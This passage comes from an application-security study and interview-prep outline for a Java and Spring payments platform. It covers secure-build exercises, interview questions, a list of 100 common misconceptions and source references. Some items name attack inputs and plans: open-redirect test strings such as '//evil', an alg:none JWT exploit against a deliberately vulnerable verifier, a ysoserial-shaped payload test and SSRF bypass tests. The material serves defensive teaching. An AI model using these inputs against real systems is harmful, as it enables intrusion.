      format carrying the parameters, `upgradeEncoding`, and a calibration test that fails if
      verification is faster than the target. Diff vs `Argon2PasswordEncoder` and
      `DelegatingPasswordEncoder`. `[BUILD]`
4.1.3 An **enumeration-resistant, timing-flattened login service**: identical response bodies,
      a dummy hash for a missing user, a per-account and per-IP limiter, and the audit events.
      Diff vs `DaoAuthenticationProvider`'s `mitigateAgainstTimingAttack`. `[BUILD]`
4.1.4 A **breached-password check** against the HIBP range API with k-anonymity, a cache, a
      timeout, and a fail-open decision that is explicitly justified. Diff vs a commercial
      credential-screening service. `[BUILD]`
4.1.5 A **password-reset flow** end to end: token generation, hashed storage, single use, TTL,
      account binding, session invalidation, canonical-host link construction, and
      enumeration-proof responses. Diff vs a hosted IdP's flow. `[BUILD]`
4.1.6 A **TOTP enroller and verifier** (RFC 6238) with the shared-secret generation, the
      `otpauth://` URI, the ±1 drift window, and used-counter replay prevention. Diff vs a
      commercial MFA service. `[BUILD]`
4.1.7 A **backup-code system**: 10 single-use codes, hashed, rate-limited, invalidated on
      regeneration. Diff vs the real thing. `[BUILD]`
4.1.8 A **step-up authentication gate** for withdrawals: an `acr`/`auth_time` freshness check, a
      `403` with an `insufficient_user_authentication` challenge, and the re-authentication
      round-trip. Diff vs RFC 9470's full mechanism. `[BUILD]`
4.1.9 A **concurrent-session limiter** with a registry, eviction of the oldest session, and a
      "log me out everywhere" endpoint. Diff vs `SessionRegistry` +
      `ConcurrentSessionControlAuthenticationStrategy`. `[BUILD]`
4.1.10 A **`SecurityContext`-propagating executor** for the `PaymentRun` batch, plus the negative
       test that proves the naive executor loses the principal. Diff vs
       `DelegatingSecurityContextExecutorService`. `[BUILD]`

*(10 leaves)*

## §4.2 Tokens

4.2.1 A **JWT issuer and verifier from scratch** on top of Nimbus: ES256, a pinned algorithm, a
      `kid`, `iss`/`aud`/`exp`/`nbf`/`jti`/`typ`, and a verifier that rejects `none`, rejects an
      unexpected `alg`, rejects a missing `aud`, and bounds clock skew. Diff vs
      `NimbusJwtDecoder` + `JwtAuthenticationProvider`. `[BUILD]`
4.2.2 A **deliberately vulnerable verifier and its exploit**, then the fix — demonstrate
      `alg:none` and RS256→HS256 confusion against your own code so the mechanism is felt, not
      recited. Diff vs why real libraries changed their APIs. `[BUILD]` `[ATTACK]`
4.2.3 A **JWKS endpoint and a caching client** with `kid` lookup, rate-limited refresh on an
      unknown `kid`, a negative cache, and a fail-closed policy. Diff vs Nimbus `RemoteJWKSet`.
      `[BUILD]`
4.2.4 A **key-rotation runner** for `JwtService`: generate, publish, promote to signing, retire
      after the overlap window, with the state machine and the tests. Diff vs a KMS-backed
      rotation. `[BUILD]`
4.2.5 A **refresh-token store with rotation and reuse detection**: token families, single use,
      family revocation on reuse, and a grace window for the parallel-tab race. Diff vs an AS's
      implementation. `[BUILD]`
4.2.6 A **`jti` denylist** in Redis with a TTL equal to the access-token lifetime, and the
      arithmetic showing the memory bound at QuizStakes volumes. Diff vs full introspection.
      `[BUILD]` `[NUM]`
4.2.7 A **DPoP proof generator and validator**: the client key pair, the proof JWT with
      `htm`/`htu`/`iat`/`jti`/`ath`, the `cnf.jkt` binding check, a replay cache, and the server
      `nonce` challenge. Diff vs a full RFC 9449 implementation. `[BUILD]`
4.2.8 An **opaque-token introspection client** with caching and a circuit breaker, plus the
      fail-closed decision. Diff vs `SpringOpaqueTokenIntrospector`. `[BUILD]`
4.2.9 The **gateway token-swap filter**: strip the client token at `ApplicationGateway`, verify it,
      mint an internal application token with only an identity claim, and forward. This is the
      single most QuizStakes-specific build in the guide. Diff vs a real API gateway's JWT
      transformation. `[BUILD]` `[SOURCE]`

*(9 leaves)*

## §4.3 Authorization

4.3.1 An **owner-scoped repository layer**: `findByIdAndClientId`, a `@Query` variant, and a test
      that proves the cross-client read returns empty rather than throwing. Diff vs relying on a
      service-layer check. `[BUILD]`
4.3.2 A **custom `AuthorizationManager<RequestAuthorizationContext>`** implementing the
      restriction-aware decision with the 30 ms budget, a timeout, and a fail-closed fallback.
      Diff vs `AuthorityAuthorizationManager`. `[BUILD]` `[NUM]`
4.3.3 A **`PermissionEvaluator`** so `@PreAuthorize("hasPermission(#depositId, 'DEPOSIT', 'read')")`
      works, with the lookup and the caching decision. Diff vs Spring Security ACL. `[BUILD]`
4.3.4 A **separation-of-duties check** for `PaymentRun`: the creator cannot approve, enforced in
      the domain with a unique constraint plus a policy check, with the concurrency test. Diff vs
      a workflow engine. `[BUILD]` `[SOURCE]`
4.3.5 A **PostgreSQL row-level-security setup** for tenant/client isolation with a session
      variable set per request, and the test that proves a forgotten `WHERE` still cannot leak.
      Diff vs application-only enforcement. `[BUILD]` `[X-REF 09]`
4.3.6 An **authorization matrix test harness**: a table of (endpoint, method, role, resource
      ownership, expected status) driving parameterized tests, generating a report. Diff vs a
      commercial API-security scanner. `[BUILD]` `[X-REF 16]`
4.3.7 A **two-chain `SecurityFilterChain` configuration** — stateless `/api/**` for clients,
      session-based `/operator/**` for `InternalPlatforms` — with every option justified and the
      ordering tested. Diff vs a single chain with conditionals. `[BUILD]`

*(7 leaves)*

## §4.4 Input, output and injection

4.4.1 A **safe dynamic-sort resolver**: an allowlist map from API field name to column, a
      direction enum, and a `Pageable` builder that cannot emit user text into SQL, with the
      injection test. Diff vs Spring Data's `Sort` handling. `[BUILD]`
4.4.2 A **safe search endpoint** with `LIKE` escaping, a length cap, and a parameterized query.
      Diff vs a full-text search engine's handling. `[BUILD]`
4.4.3 A **context-aware encoding utility** demonstrating the same string in five contexts with
      OWASP Java Encoder, plus the rendered output for each. Diff vs a template engine's
      auto-escaping. `[BUILD]`
4.4.4 An **HTML sanitizer policy** with OWASP Java HTML Sanitizer for operator-authored notes:
      the allowed elements/attributes, URL protocol allowlist, and the tests that prove
      `<img onerror>` and `javascript:` are removed. Diff vs DOMPurify client-side. `[BUILD]`
4.4.5 A **CSP nonce filter and Thymeleaf integration**: a per-response CSPRNG nonce, the header,
      the `nonce` attribute on every script, and a test that asserts a new nonce per response.
      Diff vs a framework-integrated CSP module. `[BUILD]`
4.4.6 A **hardened XML parsing utility** — one factory method per parser type with every
      XXE-relevant feature disabled — plus the XXE and billion-laughs tests that fail against a
      default parser. Diff vs a library that is secure by default. `[BUILD]`
4.4.7 A **safe path resolver** for `DocumentRequirements`: base directory, `normalize()`,
      `startsWith` verification, symlink handling, and the traversal test set. Diff vs a
      framework's resource resolver. `[BUILD]`
4.4.8 A **safe archive extractor** with Zip-Slip prevention, an entry count cap, an uncompressed
      size cap and a compression-ratio cap. Diff vs `commons-compress` defaults. `[BUILD]`
4.4.9 A **file-upload pipeline**: extension allowlist, magic-byte verification, size cap, generated
      filename, quarantine, scan, promote, and serve-from-another-origin with
      `Content-Disposition` + `nosniff`. Diff vs a managed upload service. `[BUILD]`
4.4.10 A **CSV export that is formula-injection safe**, with the prefixing rule and the operator
       report test. Diff vs a spreadsheet library's escaping. `[BUILD]`
4.4.11 A **deserialization filter** for a legacy `ObjectInputStream` path: an allowlist pattern
       string plus `maxdepth`/`maxarray`/`maxrefs`/`maxbytes`, a JEP 415 filter factory, and the
       test that a ysoserial-shaped payload is rejected. Diff vs removing serialization entirely.
       `[BUILD]`
4.4.12 A **Jackson configuration** that is safe by construction: no default typing, a
       `PolymorphicTypeValidator` allowlist where polymorphism is genuinely needed, unknown-field
       rejection, and sealed-interface modelling as the better answer. Diff vs the defaults.
       `[BUILD]` `[X-REF 04]`

*(12 leaves)*

## §4.5 Browser-facing controls

4.5.1 A **complete security-headers filter** emitting the full § 1.14.1 set with values justified
      per header, plus a `MockMvc` test asserting each one. Diff vs Spring Security's
      `HeaderWriterFilter`. `[BUILD]`
4.5.2 A **Fetch-Metadata resource-isolation filter**: the decision table over
      `Sec-Fetch-Site`/`-Mode`/`-Dest`, an allowlist for legitimate cross-site entry points, and
      report-only mode first. Diff vs Spring Security's built-in support. `[BUILD]` `[RESEARCH]`
4.5.3 A **stateless signed double-submit CSRF implementation** (HMAC over the session id +
      timestamp), with the related-domain-attacker analysis of why it is weaker than a
      synchronizer token. Diff vs `CsrfFilter` + `XorCsrfTokenRequestAttributeHandler`. `[BUILD]`
4.5.4 A **strict CORS configuration** with a static allowlist, credentials, exposed headers,
      `Vary: Origin`, and the tests that prove a near-miss origin is rejected. Diff vs
      `CorsConfiguration`'s pattern support. `[BUILD]`
4.5.5 A **safe redirect endpoint**: an indirection token or an allowlist of relative paths, with
      the open-redirect test set (`//evil`, `https://evil`, `\/\/evil`, `%2f%2f`). Diff vs a
      framework's redirect handling. `[BUILD]`
4.5.6 A **CSP report collector** endpoint with schema validation, rate limiting, noise filtering
      and a metric. Diff vs a hosted reporting service. `[BUILD]`
4.5.7 A **secure logout** implementation: session invalidation, cookie clearing with matching
      attributes, `Clear-Site-Data`, refresh-token revocation, and OIDC RP-initiated logout. Diff
      vs `LogoutFilter` + `OidcClientInitiatedLogoutSuccessHandler`. `[BUILD]`

*(7 leaves)*

## §4.6 Network-facing and crypto

4.6.1 An **SSRF-safe HTTP fetcher**: parse, allowlist the scheme, resolve DNS once, validate every
      resolved address against the § 2.10.8 CIDR set, connect to the pinned IP with the original
      `Host`, disable redirects, cap the response size and the timeout. With the full bypass test
      suite from § 2.10.9. Diff vs an egress proxy. `[BUILD]`
4.6.2 An **egress-proxy-enforced configuration** as the alternative, and the code that trusts it.
      Diff vs application-only validation. `[BUILD]`
4.6.3 A **webhook receiver** for the `BDP-*` inbound bank-deposit push: HMAC signature over
      timestamp + raw body, constant-time compare, replay window, dual-secret support for
      rotation, idempotency key, and the raw-body-capture problem in Spring. Diff vs Standard
      Webhooks / a PSP SDK. `[BUILD]` `[X-REF 12]`
4.6.4 A **webhook sender** with signing, retries with backoff, and the SSRF constraints on the
      subscriber URL. Diff vs a managed webhook platform. `[BUILD]`
4.6.5 An **envelope-encryption service** for a PII field: per-record DEK, KEK wrapping, key id in
      the stored ciphertext, AAD binding to the record id, and a rotation routine that rewraps
      without re-encrypting. Diff vs AWS Encryption SDK / Google Tink. `[BUILD]`
4.6.6 A **blind index** for equality search over an encrypted field, with the leak analysis. Diff
      vs a searchable-encryption product. `[BUILD]`
4.6.7 A **secure token/credential generator** utility with the entropy arithmetic, base64url
      output, a key-prefix scheme for leak detection, and hashed storage for API keys. Diff vs a
      cloud provider's key format. `[BUILD]`
4.6.8 An **mTLS client and server** pair with SSL bundles, a reloadable keystore, and a test that
      an untrusted client certificate is rejected. Diff vs a service mesh. `[BUILD]`
4.6.9 A **TLS/headers synthetic probe** asserting protocol version, cipher suite, certificate
      expiry, HSTS and CSP as a scheduled check. Diff vs `testssl.sh` in CI. `[BUILD]`

*(9 leaves)*

## §4.7 Abuse, limits and operations

4.7.1 A **multi-key distributed rate limiter** on Redis with an atomic Lua token bucket, keys for
      account/IP/global, the `429` + `Retry-After` response, and the correctness test under
      concurrency. Diff vs Bucket4j and an API gateway limiter. `[BUILD]` `[X-REF 15]`
4.7.2 A **login-abuse detector**: per-account throttling with progressive delay, a global
      failure-rate metric, an alert threshold, and a CAPTCHA/step-up escalation — explicitly
      avoiding hard lockout. Diff vs a commercial bot-management product. `[BUILD]`
4.7.3 A **bonus-abuse velocity check** for the "10% of first deposit capped at 100" rule: identity
      linking signals, a velocity window, and a review queue. Diff vs a fraud platform. `[BUILD]`
      `[SOURCE]` `[NUM]`
4.7.4 An **idempotent deposit endpoint** with an `Idempotency-Key`, a stored response, and the
      concurrency test proving no double credit. Diff vs a payment provider's implementation.
      `[BUILD]` `[X-REF 12]`
4.7.5 A **fail-closed restriction client**: a 30 ms timeout, a circuit breaker whose fallback
      **denies**, and the metric that proves it. Diff vs a naive `RestClient` call. `[BUILD]`
      `[SOURCE]` `[NUM]`
4.7.6 An **atomic stake reservation** that cannot be raced: a single conditional `UPDATE` across
      the bonus and cash buckets, plus `@Version` and a unique constraint, with a concurrency test
      that fails against the check-then-act version. Diff vs the real ledger design. `[BUILD]`
      `[X-REF 09]`
4.7.7 An **immutable, hash-chained audit log** for security events, with a verification routine.
      Diff vs a managed audit service / WORM storage. `[BUILD]`
4.7.8 A **log-sanitizing appender/converter** that strips newlines, redacts tokens and card
      numbers by pattern, and drops known-sensitive fields — plus a test that a token in an
      exception message never reaches the log. Diff vs Logback's built-in facilities. `[BUILD]`
4.7.9 A **`SecurityEvent` → Micrometer + audit-store listener** for every Spring Security event.
      Diff vs Spring Boot's `AuditEventRepository`. `[BUILD]`
4.7.10 A **security-regression test suite** as a single artifact: headers, CSRF required, CORS
       rejection, authorization matrix, no-PII-in-logs, SSRF allowlist, rate limit, and TLS
       config. This is the deliverable that makes the whole guide operational. `[BUILD]`
       `[X-REF 16]`

*(10 leaves)*

## §4.8 Analysis artifacts

4.8.1 A **threat model of the deposit flow** as a written artifact: DFD, trust boundaries, STRIDE
      table, prioritised mitigations, and the decisions taken. Diff vs a tool-generated model.
      `[BUILD]`
4.8.2 An **attack tree** for "withdraw money that is not mine", fully decomposed. `[BUILD]`
4.8.3 A **secure-design review checklist** for QuizStakes pull requests, one page. `[BUILD]`
4.8.4 A **dependency-triage decision record** for a real advisory, showing the KEV/EPSS/
      reachability reasoning and the accepted-risk statement. `[BUILD]`
4.8.5 A **CI security pipeline** as a working config: secret scanning, SpotBugs+find-sec-bugs,
      Semgrep rules, dependency-check/OSV with a gate policy, CycloneDX SBOM generation, cosign
      signing, and the ZAP baseline scan. Diff vs a commercial ASPM platform. `[BUILD]`
      `[X-REF 16]`

*(5 leaves)*

**PART 4 total: 69 leaves.**

---

# PART 5 — INTERVIEW AND RETENTION

## §5.1 The questions, with the answer shape

5.1.1 The **opening-round set** (10): AuthN vs AuthZ; what is XSS and how do you stop it; what is
      CSRF and why does a Bearer API not need protection; what is SQL injection and why do
      prepared statements fix it; how do you store passwords; what is CORS and does it protect
      your API; what is a JWT and what do you validate; what is HTTPS actually giving you; what is
      the OWASP Top 10; what is IDOR. Each with the one-paragraph mechanism-first answer.
      `[TABLE]`
5.1.2 The **mechanism-depth set** (25): why is bcrypt better than SHA-256 with a salt; what
      exactly does a salt defeat and what does it not; why is memory hardness useful; what is the
      RS256→HS256 attack; why must you pin the algorithm; what does `aud` protect against; how do
      you revoke a JWT; why is `SameSite=Lax` not a complete CSRF defence; what makes a
      synchronizer token unguessable; why is double-submit weaker; what conditions prevent a CORS
      preflight; why can't `Allow-Origin: *` be combined with credentials; what does `HttpOnly`
      actually buy; why is `localStorage` worse than a cookie, and why is that not the whole
      story; what does PKCE defend against that `state` does not; what does `nonce` defend against
      that `state` does not; why was implicit deprecated; why must redirect URIs be exact-matched;
      what is a mix-up attack; why is SSRF so severe in the cloud; why must DNS resolution precede
      validation; why is deserialization RCE by construction; what does a CSP nonce give you that
      an allowlist does not; why is GCM nonce reuse catastrophic; what is a padding oracle.
      `[TABLE]`
5.1.3 The **design set** (15): design authentication for a new payments platform; design token
      handling for an SPA plus a mobile app plus a partner integration; design authorization for
      2.4M clients and 200 operators; design the login endpoint's abuse defences; design secrets
      management and rotation; design a webhook receiver; design a file-upload feature; design
      multi-tenant data isolation; design the audit trail; design the CI security gates; design
      key rotation for `JwtService`; design a self-exclusion that takes effect in 500 ms; design
      the restriction check inside 30 ms; design an internal service-to-service auth scheme;
      design the security review process for a 40-engineer org. `[TABLE]` `[NUM]`
5.1.4 The **incident/debug set** (10): a user reports seeing another user's data — what do you do;
      a secret was committed — what do you do; an SCA scan shows 300 criticals — what do you do; a
      pentest reports a stored XSS in an operator console — how bad is it; tokens started failing
      at 3am; the login endpoint is under a credential-stuffing attack right now; a dependency was
      published maliciously; a certificate expired in production; someone disabled certificate
      validation "temporarily" a year ago; a `403` appears on every POST after a framework
      upgrade. `[TABLE]`
5.1.5 The **judgment set** (10): when is disabling CSRF correct; when is a JWT the wrong choice;
      when is MFA not worth it; when do you accept a risk and how do you write that down; when is
      a WAF worth buying; build vs buy for identity; how do you convince a product manager to fund
      a security fix; how do you say no to a security control; what do you do when the secure
      option misses the latency budget; how do you handle a finding you disagree with. `[TABLE]`
5.1.6 The **staff-level set** (10): how would you test vertical access control across 20 roles and
      300 endpoints; how do you roll out CSP to a legacy app without breaking it; how do you
      migrate 2.4M password hashes to Argon2id without a mass reset; how do you introduce mTLS
      across 11 services; how do you make security testing a default rather than a gate; how do
      you measure whether your security posture improved; what is your dependency policy and how
      do you defend it; how do you threat model in a two-week sprint; how do you handle a
      third-party vendor's security failure; what would you do first joining a team with no
      security practice. `[TABLE]`
5.1.7 The **specialist-probe set** for candidates who claim depth (10, drawn from the AppSec
      interview surface): the difference between web cache poisoning and web cache deception; the
      `TE.TE` and `CL.0` smuggling variants; the two preconditions for session fixation; DOM
      clobbering; prototype pollution; type juggling and why JSON helps; JWKs vs JKUs; GraphQL
      batching as a rate-limit bypass; XML parameter entities and their limits in XXE; the
      circumstances under which `sessionStorage` survives. `[TABLE]` `[RESEARCH]`
5.1.8 The **"explain it to a non-engineer"** set (5): what is a breach; why can't you tell me my
      password; why do we need MFA; what does this pentest finding mean for the business; why does
      this fix take three weeks.
5.1.9 The **questions to ask the interviewer** that signal seniority: who owns security decisions,
      what happens when a finding blocks a release, how is threat modelling done, what is the
      last incident and what changed.
5.1.10 The **60-second verbal answer** for the five highest-frequency questions, scripted, so they
       come out clean under pressure: XSS, CSRF, SQLi, password storage, and JWT validation.
       `[TABLE]`

*(10 leaves)*

## §5.2 The trap list

Each entry states the wrong belief, the symptom it produces, and the correction. Every `[TRAP]` in
Parts 1–4 appears here, plus the following.

5.2.1 "CORS protects my API." `[TRAP]`
5.2.2 "A CORS error means the request did not reach my server." `[TRAP]`
5.2.3 "We reflect the Origin header, that is the same as an allowlist." `[TRAP]`
5.2.4 "We use JWTs, so CSRF does not apply." `[TRAP]`
5.2.5 "`HttpOnly` means XSS cannot hurt us." `[TRAP]`
5.2.6 "`localStorage` is fine because we sanitize inputs." `[TRAP]`
5.2.7 "The JWT payload is encrypted." `[TRAP]`
5.2.8 "We validate the signature, so the token is trustworthy." (No `aud`, no `iss`, no `typ`.)
      `[TRAP]`
5.2.9 "We can revoke a JWT." `[TRAP]`
5.2.10 "Short expiry is the same as revocation." `[TRAP]`
5.2.11 "PKCE is only for mobile." `[TRAP]` `[VERSION-TRAP]`
5.2.12 "`state` and `nonce` are the same thing." `[TRAP]`
5.2.13 "An ID token is an API credential." `[TRAP]`
5.2.14 "Scopes are permissions." `[TRAP]`
5.2.15 "OAuth is an authentication protocol." `[TRAP]`
5.2.16 "We hash passwords with SHA-256 and a salt, that is secure." `[TRAP]`
5.2.17 "Encrypting passwords is fine because the key is safe." `[TRAP]`
5.2.18 "A pepper replaces a salt." `[TRAP]`
5.2.19 "Users must change passwords every 90 days." `[TRAP]` `[VERSION-TRAP]`
5.2.20 "Complexity rules make passwords stronger." `[TRAP]` `[VERSION-TRAP]`
5.2.21 "Account lockout stops brute force." `[TRAP]`
5.2.22 "Rate limiting per IP is enough." `[TRAP]`
5.2.23 "MFA means SMS or TOTP." `[TRAP]` `[VERSION-TRAP]`
5.2.24 "TOTP is phishing-resistant." `[TRAP]`
5.2.25 "TLS means the request is safe." `[TRAP]`
5.2.26 "Internal traffic does not need TLS." `[TRAP]`
5.2.27 "The certificate is valid, so we verified the host." (Hostname verification is separate.)
       `[TRAP]`
5.2.28 "We'll re-enable certificate validation later." `[TRAP]`
5.2.29 "mTLS gives us user identity." `[TRAP]`
5.2.30 "Escaping input at the boundary prevents SQL injection." `[TRAP]`
5.2.31 "An ORM makes us immune to SQLi." `[TRAP]`
5.2.32 "Stored procedures prevent SQLi." `[TRAP]`
5.2.33 "You can parameterize a column name." `[TRAP]`
5.2.34 "We don't show errors, so blind SQLi is not exploitable." `[TRAP]`
5.2.35 "Sanitizing on input is the fix for XSS." `[TRAP]`
5.2.36 "One escaping function works everywhere." `[TRAP]`
5.2.37 "React makes XSS impossible." `[TRAP]`
5.2.38 "A regex can strip dangerous HTML." `[TRAP]`
5.2.39 "CSP fixes XSS." `[TRAP]`
5.2.40 "A host allowlist is a good CSP." `[TRAP]`
5.2.41 "The nonce can be per session." `[TRAP]`
5.2.42 "`X-XSS-Protection` should be set." `[TRAP]` `[VERSION-TRAP]`
5.2.43 "`X-Frame-Options` is the modern anti-clickjacking control." `[TRAP]`
5.2.44 "Framebusting JavaScript works." `[TRAP]`
5.2.45 "`Path` on a cookie is a security boundary." `[TRAP]`
5.2.46 "Setting `Domain` narrows the cookie." `[TRAP]`
5.2.47 "`Secure` guarantees integrity." `[TRAP]`
5.2.48 "A subdomain cannot touch our session cookie." `[TRAP]`
5.2.49 "Client-side validation is a control." `[TRAP]`
5.2.50 "A UUID in the URL is authorization." `[TRAP]`
5.2.51 "Checking `isAuthenticated()` is access control." `[TRAP]`
5.2.52 "We check ownership after loading, which is equivalent." `[TRAP]`
5.2.53 "`@PreAuthorize` protects an internal call." `[TRAP]`
5.2.54 "`@PostAuthorize` prevents the action." `[TRAP]`
5.2.55 "The gateway does authorization, so services don't need to." `[TRAP]`
5.2.56 "Roles in the token are fine to trust for permissions." `[TRAP]` `[SOURCE]`
5.2.57 "Only the front end can call this endpoint." `[TRAP]`
5.2.58 "`POST` cannot be triggered cross-site." `[TRAP]`
5.2.59 "Requiring `application/json` prevents CSRF." `[TRAP]`
5.2.60 "SSRF only matters if we return the response." `[TRAP]`
5.2.61 "We block `127.0.0.1` and `169.254.169.254`, so SSRF is handled." `[TRAP]`
5.2.62 "Validating the hostname before the request is enough." (Rebinding.) `[TRAP]`
5.2.63 "We only follow HTTPS redirects, so it is safe." `[TRAP]`
5.2.64 "`ObjectInputStream` with a filter is safe for untrusted input." `[TRAP]`
5.2.65 "JSON cannot cause RCE." (Polymorphic typing.) `[TRAP]`
5.2.66 "YAML is just data." `[TRAP]`
5.2.67 "Logging a user-supplied string is harmless." (Log4Shell, log injection.) `[TRAP]`
5.2.68 "An SBOM means we are secure." `[TRAP]`
5.2.69 "We only use popular packages, so supply chain is not our risk." `[TRAP]`
5.2.70 "CVSS 9.8 means fix it first." `[TRAP]`
5.2.71 "Signing artifacts is enough." (Verification at deploy.) `[TRAP]`
5.2.72 "`docker history` doesn't show build args." `[TRAP]`
5.2.73 "Base64 in a Kubernetes Secret is encryption." `[TRAP]`
5.2.74 "Deleting the commit removes the secret." `[TRAP]`
5.2.75 "Environment variables are private." `[TRAP]`
5.2.76 "Encryption at rest protects against an application compromise." `[TRAP]`
5.2.77 "`Cipher.getInstance("AES")` is AES encryption." (It is ECB.) `[TRAP]`
5.2.78 "CBC is fine, it is standard." `[TRAP]`
5.2.79 "Reusing an IV is a minor issue." `[TRAP]`
5.2.80 "`Random` is random enough for a token." `[TRAP]`
5.2.81 "`String.equals` is fine for comparing a MAC." `[TRAP]`
5.2.82 "SHA-1 is broken so HMAC-SHA1 is broken." `[TRAP]`
5.2.83 "We built our own crypto because the library was awkward." `[TRAP]`
5.2.84 "A WAF handles injection." `[TRAP]`
5.2.85 "A green pentest report means we are secure." `[TRAP]`
5.2.86 "SAST found nothing, so the code is safe." `[TRAP]`
5.2.87 "100% of dependencies patched is the goal." `[TRAP]`
5.2.88 "Security is the security team's job." `[TRAP]`
5.2.89 "Nobody knows this endpoint exists." `[TRAP]`
5.2.90 "We are too small to be targeted." `[TRAP]`
5.2.91 "The bug is only exploitable by an authenticated user, so it is low severity." `[TRAP]`
5.2.92 "Self-XSS is not a vulnerability." `[TRAP]`
5.2.93 "An open redirect is cosmetic." `[TRAP]`
5.2.94 "Business-logic flaws are product bugs, not security bugs." `[TRAP]`
5.2.95 "The race condition is theoretical." `[TRAP]`
5.2.96 "We fail open so the site stays up." `[TRAP]` `[SOURCE]`
5.2.97 "The OWASP Top 10 is a checklist for being secure." `[TRAP]`
5.2.98 "OWASP Top 10 has SSRF at A10." `[TRAP]` `[VERSION-TRAP]`
5.2.99 "Spring Security's defaults are enough." `[TRAP]`
5.2.100 "We disabled security headers to fix one embed." `[TRAP]`

*(100 leaves)*

## §5.3 One-line assertions to recall under pressure

5.3.1 A cheat sheet reproducing, in one page: the cookie attribute set, the CSP starter policy,
      the JWT validation list, the OAuth flow choice, the password parameters, the header set, and
      the SSRF CIDR list. `[TABLE]`
5.3.2 The reproduced master tables from § 2.1, condensed to one page each. `[TABLE]`
5.3.3 The two decision trees worth memorising: "which auth mechanism" and "which CSRF strategy".
      `[TABLE]`
5.3.4 The fifteen numbers to know cold: 128-bit session entropy, bcrypt cost ≥ 10,
      Argon2id 46 MiB/t=1/p=1, PBKDF2-HMAC-SHA256 600 000, bcrypt's 72 bytes, cookie 4096 octets,
      cookie 400 days, access token 5–15 min, clock skew 30–60 s, `code_verifier` 43–128 chars,
      TOTP 30 s / 6 digits, GCM 96-bit IV / 128-bit tag, HSTS `max-age=63072000`,
      QuizStakes 30 ms restriction / 500 ms self-exclusion / 150 ms stake reservation, and
      GDPR's 72 hours. `[NUM]` `[TABLE]`
5.3.5 The three-axis trade-off drills (security × latency × operability) on: token lifetime, policy
      centralisation, and hashing work factor. `[TABLE]`
5.3.6 The **anti-checklist** — five things it is fine not to know, so the reader stops
      over-preparing: the byte layout of a TLS record, the full CWE list, every CVE number, the
      internals of a specific IdP product, and the mathematics of elliptic curves.
5.3.7 The single-sentence summary of the whole guide: *every vulnerability in this file is
      attacker-controlled data crossing a boundary that did not check it, or an authority being
      used by someone who should not have it — name the boundary and name the authority, and the
      defence follows.* `[PROVE]`

*(7 leaves)*

**PART 5 total: 117 leaves.**

---

## Sources consulted

| Source | URL | What it contributed |
|---|---|---|
| OWASP Top 10:2025 (official site) | https://owasp.org/Top10/2025/ | **The full 2025 category list with exact identifiers**: A01 Broken Access Control, A02 Security Misconfiguration, A03 Software Supply Chain Failures, A04 Cryptographic Failures, A05 Injection, A06 Insecure Design, A07 Authentication Failures, A08 Software or Data Integrity Failures, A09 Security Logging and Alerting Failures, A10 Mishandling of Exceptional Conditions. **The fetched page did not carry the methodology figures or the 2021→2025 diff** — the write pass must fetch `0x00_2025-Introduction` and `0x01_2025-About_OWASP` for CWE counts, incidence rates and the rename/merge detail, and must confirm where SSRF went. `[RESEARCH]` |
| OWASP Top 10:2025 secondary coverage | https://cybersecuritynews.com/owasp-top-10-2025/ , https://blog.qualys.com/qualys-insights/2026/06/15/what-changed-in-owasp-top-10-2025-and-recommendations-for-each-category , https://fluidattacks.com/blog/owasp-top-10-2025 | The two-new-categories framing and the Misconfiguration 5→2 movement. **Secondary sources — every claim taken from them is tagged `[RESEARCH]` and must be re-verified against owasp.org before the bible states it.** |
| OAuth 2.1 draft | https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13 (May 2025) | **PKCE mandatory (§ 4.1.1) with `code_challenge`/`code_verifier` MUST language; exact redirect-URI matching (§ 2.3.1) with the loopback-port exception; implicit and ROPC removed (§ 1.3, § 10.1); bearer tokens forbidden in query strings (§ 5.1.2, § 1.4.2); refresh tokens bound to scope and resource servers (§ 3.2.3, § 4.3.3); sender-constraining via DPoP RFC 9449 and mTLS RFC 8705 (§ 1.4.3); § 10 "Differences from OAuth 2.0"** |
| RFC 9700 — OAuth 2.0 Security BCP (BCP 240) | https://www.rfc-editor.org/rfc/rfc9700.html | **The complete § 2 Best Practices structure** (2.1 protecting redirect-based flows incl. 2.1.1 auth code / 2.1.2 implicit, 2.2 token replay prevention incl. 2.2.1 access / 2.2.2 refresh, 2.3 access-token privilege restriction, 2.4 ROPC, 2.5 client authentication, 2.6 other) and **the complete § 4 attack list with section numbers** (4.1 insufficient redirect-URI validation, 4.2 `Referer` leakage, 4.3 browser-history leakage, 4.4 mix-up, 4.5 authorization code injection, 4.6 access token injection, 4.7 CSRF, 4.8 PKCE downgrade, 4.9 token leakage at the resource server, 4.10 misuse of stolen tokens, 4.11 open redirection, 4.12 307 redirect, 4.13 TLS-terminating reverse proxies, 4.14 refresh token protection, 4.15 client impersonating resource owner, 4.16 clickjacking, 4.17 in-browser communication flows); the ROPC **MUST NOT**; the implicit **SHOULD NOT**; the mTLS/DPoP sender-constraining language |
| RFC 8725 — JWT Best Current Practices | https://www.rfc-editor.org/rfc/rfc8725.html | **Every § 2 threat** (2.1 weak signatures / insufficient validation incl. `none` and RS256↔HS256 confusion, 2.2 weak symmetric keys, 2.3 incorrect composition of encryption and signature, 2.4 plaintext leakage via ciphertext length, 2.5 insecure EC encryption / invalid curve, 2.6 multiplicity of JSON encodings, 2.7 substitution attacks, 2.8 cross-JWT confusion, 2.9 indirect attacks on the server) and **every § 3 best practice** (3.1 algorithm verification, 3.2 appropriate algorithms + deterministic ECDSA per RFC 6979, 3.3 validate all cryptographic operations, 3.4 validate cryptographic inputs, 3.5 sufficient key entropy, 3.6 avoid compression of encryption inputs, 3.7 UTF-8, 3.8 validate issuer and subject, 3.9 use and validate audience, 3.10 do not trust received claims — `kid`/`jku`/`x5u` injection and SSRF, 3.11 explicit typing, 3.12 mutually exclusive validation rules) |
